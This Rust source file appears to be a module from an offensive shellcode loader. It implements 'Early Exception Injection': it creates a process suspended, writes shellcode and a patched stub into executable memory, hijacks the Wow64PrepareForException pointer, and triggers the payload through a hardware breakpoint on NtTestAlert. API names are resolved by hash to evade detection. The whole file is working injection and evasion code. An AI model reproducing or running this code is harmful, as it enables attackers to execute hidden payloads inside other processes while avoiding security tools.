use std::ffi::c_void;
use windows_sys::Win32::System::Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED};
use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
use windows_sys::Win32::Foundation::GetLastError;
use crate::syscall::common::env::get_loaded_module_by_hash;
use crate::syscall::common::pe::get_export_by_hash;

mod wow64;
mod stub;

const CONTEXT_AMD64: u32 = 0x00100000;
const CONTEXT_DEBUG_REGISTERS: u32 = CONTEXT_AMD64 | 0x00000010;

const NTDLL_HASH: u32 = crate::dbj2_hash!(b"ntdll.dll");
const NT_PROTECT_HASH: u32 = crate::dbj2_hash!(b"NtProtectVirtualMemory");
const NT_TEST_ALERT_HASH: u32 = crate::dbj2_hash!(b"NtTestAlert");

#[cfg(feature = "run_early_exception_inject")]
pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Starting Early Exception Injection...");

    let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
    let wow64_prepare_for_exception = wow64::return_wow64_function_pointer(ntdll as *mut u8).ok_or("Failed to find Wow64PrepareForException")?;
    
    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Wow64PrepareForException pointer: {:p}", wow64_prepare_for_exception));

    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let app_name = std::ffi::CString::new(target_program).unwrap();
    let success = CreateProcessA(
        std::ptr::null(),
        app_name.as_ptr() as *mut u8,
        std::ptr::null(),
        std::ptr::null(),
        0,
        CREATE_SUSPENDED,
        std::ptr::null(),
        std::ptr::null(),
        &startup_info,
        &mut process_info,
    );

    if success == 0 {
        let err = GetLastError();
        return Err(format!("CreateProcessA failed with error: {}", err));
    }

    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Process created. PID: {}, TID: {}", process_info.dwProcessId, process_info.dwThreadId));

    // Allocate memory for shellcode
    use crate::api::PAGE_EXECUTE_READWRITE;
    let shellcode_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Shellcode allocated at: {:#x}", shellcode_addr));

    // Allocate memory for stub
    let stub_data = stub::get_stub();
    let stub_size = stub_data.len();
    let stub_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, stub_size, PAGE_EXECUTE_READWRITE)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Stub allocated at: {:#x}", stub_addr));

    // Prepare stub
    let mut stub_data = stub_data;
    let nt_protect_addr = get_export_by_hash(ntdll, NT_PROTECT_HASH).ok_or("NtProtectVirtualMemory not found")?;
    
    // Patch stub
    stub_data[74..82].copy_from_slice(&(nt_protect_addr as usize).to_le_bytes());
    stub_data[10..18].copy_from_slice(&(wow64_prepare_for_exception as usize).to_le_bytes());
    stub_data[93..101].copy_from_slice(&(wow64_prepare_for_exception as usize).to_le_bytes());
    stub_data[131..139].copy_from_slice(&(shellcode_addr as usize).to_le_bytes());

    // Write shellcode
    let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
    crate::api::write_virtual_memory(process_info.hProcess, shellcode_addr, shellcode_slice)?;

    // Write stub
    crate::api::write_virtual_memory(process_info.hProcess, stub_addr, &stub_data)?;

    // Overwrite Wow64PrepareForException pointer
    let stub_addr_bytes = (stub_addr as usize).to_le_bytes();
    crate::api::write_virtual_memory(process_info.hProcess, wow64_prepare_for_exception as usize, &stub_addr_bytes)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message("Wow64PrepareForException pointer overwritten.");

    // Trigger exception via HWBP
    let nt_test_alert_addr = get_export_by_hash(ntdll, NT_TEST_ALERT_HASH).ok_or("NtTestAlert not found")?;
    
    let mut context: CONTEXT = std::mem::zeroed();
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context.Dr0 = nt_test_alert_addr as u64;
    context.Dr7 = 0x00000001;
    
    crate::api::set_context_thread(process_info.hThread, &context as *const _ as *const c_void)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message("HWBP set on NtTestAlert.");

    crate::api::resume_thread(process_info.hThread)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message("Thread resumed.");

    Ok(())
}
